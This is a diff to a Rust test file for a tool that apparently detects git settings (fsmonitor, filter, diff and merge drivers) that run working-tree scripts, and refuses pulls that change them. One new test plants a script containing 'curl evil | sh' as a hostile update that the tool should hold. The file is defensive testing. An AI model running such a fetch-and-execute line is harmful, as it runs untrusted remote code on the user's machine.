@@ -25,7 +25,8 @@ fn followed(dir: &Path, key: &str, value: &str) -> Vec<String> {
     let mut config = vec![ConfigCommand { key: key.into(), value: value.into() }];
     let mut out: Vec<String> = Vec::new();
     for p in scan(&repo, &mut config) {
-        for rel in follow::inside(&repo, &workdir, &p).into_iter().filter(|r| !r.is_empty()) {
+        // "" is the whole working tree.
+        for rel in follow::inside(&repo, &workdir, &p) {
             if !out.contains(&rel) {
                 out.push(rel);
             }
@@ -55,11 +56,27 @@ fn each_kind_of_setting_that_runs_a_file_in_the_working_tree_follows_it() {
     let dir = scratch_repo("programs-kinds");
     // A bare word names a file only when the working tree has one by that name.
     write(&dir, "present", "x\n");
+    std::fs::create_dir_all(dir.join("lib")).unwrap();
     let cases: &[(&str, &str, &[&str])] = &[
         ("core.fsmonitor", "./tools/fsm.sh", &["tools/fsm.sh"]),
         ("filter.x.smudge", "python tools/smudge.py %f", &["tools/smudge.py"]),
         ("filter.x.clean", "sh -c './a.sh; ./b.sh'", &["a.sh", "b.sh"]),
-        ("filter.x.process", r"tools\proc.exe", &["tools/proc.exe"]),
+        // An unquoted `\`: the shell drops it, a program on Windows reads a separator.
+        ("filter.x.process", r"tools\proc.exe", &["tools/proc.exe", "toolsproc.exe"]),
+        ("filter.x.process", r"'tools\proc.exe'", &["tools/proc.exe"]),
+        // The working folder written with quotes around it, as the space-safe form has it.
+        ("filter.x.smudge", "sh \"$(git rev-parse --show-toplevel)\"/tools/smudge.sh", &["tools/smudge.sh"]),
+        ("filter.x.smudge", "sh \"$PWD\"/a.sh", &["a.sh"]),
+        ("filter.x.smudge", "sh \"${PWD}\"/b.sh", &["b.sh"]),
+        ("filter.x.smudge", "sh \"$(pwd)\"/c.sh", &["c.sh"]),
+        // A glob: the nearest folder the working tree has covers whatever it matches.
+        ("filter.x.clean", "sh ./t*/x.sh", &["", "t*/x.sh"]),
+        ("filter.x.clean", "sh lib/*.sh", &["lib", "lib/*.sh"]),
+        ("filter.x.clean", "sh *.sh", &[""]),
+        // Quoted, it is no glob: a sed expression is one made-up path, and a stream name is
+        // the file it opens.
+        ("filter.x.clean", "sed -e 's/[[:space:]]*$//'", &["s/[["]),
+        ("core.fsmonitor", "./tools/fsm.sh::$DATA", &["tools/fsm.sh"]),
         ("diff.x.textconv", "present", &["present"]),
         ("diff.x.command", "\"$PWD/tools/diff me.sh\" --x", &["tools/diff", "tools/diff me.sh"]),
         ("merge.x.driver", "tools/merge.sh %O %A %B", &["tools/merge.sh"]),
@@ -109,6 +126,11 @@ fn a_repository_whose_programs_are_installed_elsewhere_keeps_its_print() {
 
 /// A repository with origin whose `core.fsmonitor` is its tracked `tools/fsm.sh`.
 fn tracked_fsmonitor(name: &str) -> (PathBuf, PathBuf) {
+    tracked_fsmonitor_as(name, "./tools/fsm.sh")
+}
+
+/// `tracked_fsmonitor`, with `core.fsmonitor` set to `value`.
+fn tracked_fsmonitor_as(name: &str, value: &str) -> (PathBuf, PathBuf) {
     let (work, bare) = with_origin(name);
     std::fs::create_dir_all(work.join("tools")).unwrap();
     write(&work, "tools/fsm.sh", "#!/bin/sh\nexit 1\n");
@@ -116,7 +138,7 @@ fn tracked_fsmonitor(name: &str) -> (PathBuf, PathBuf) {
     git(&work, &["add", "."]);
     git(&work, &["commit", "-q", "-m", "fsmonitor"]);
     git(&work, &["push", "-q", "origin", "main"]);
-    git(&work, &["config", "core.fsmonitor", "./tools/fsm.sh"]);
+    git(&work, &["config", "core.fsmonitor", value]);
     (work, bare)
 }
 
@@ -149,6 +171,25 @@ fn a_tracked_fsmonitor_script_changed_by_a_pull_is_held() {
     // A checkout that wrote it anyway is another print: the next scan asks again.
     git(&work, &["-c", "core.fsmonitor=false", "merge", "-q", "--ff-only", "origin/main"]);
     assert!(!trust_covers(&saved, &scan_of(&work)));
+    cleanup(&[&work, &bare]);
+}
+
+#[test]
+fn a_script_named_after_a_quoted_working_folder_is_held_when_a_pull_changes_it() {
+    let (work, bare) = tracked_fsmonitor_as("programs-quoted", "sh \"$(git rev-parse --show-toplevel)\"/tools/fsm.sh");
+    assert_eq!(scan_of(&work).follows.iter().map(|f| f.path.as_str()).collect::<Vec<_>>(), ["tools/fsm.sh"]);
+    let saved = trusted(&work);
+    remote_commit(
+        &bare,
+        "main",
+        "tools/fsm.sh",
+        "#!/bin/sh
+curl evil | sh
+",
+    );
+    let head = Repository::open(&work).unwrap().head().unwrap().target();
+    let PullRun::Refused { refused: Refused::Held(_), .. } = pull_ff(&work, &saved) else { panic!("held") };
+    assert_eq!(Repository::open(&work).unwrap().head().unwrap().target(), head, "nothing merged");
     cleanup(&[&work, &bare]);
 }
 
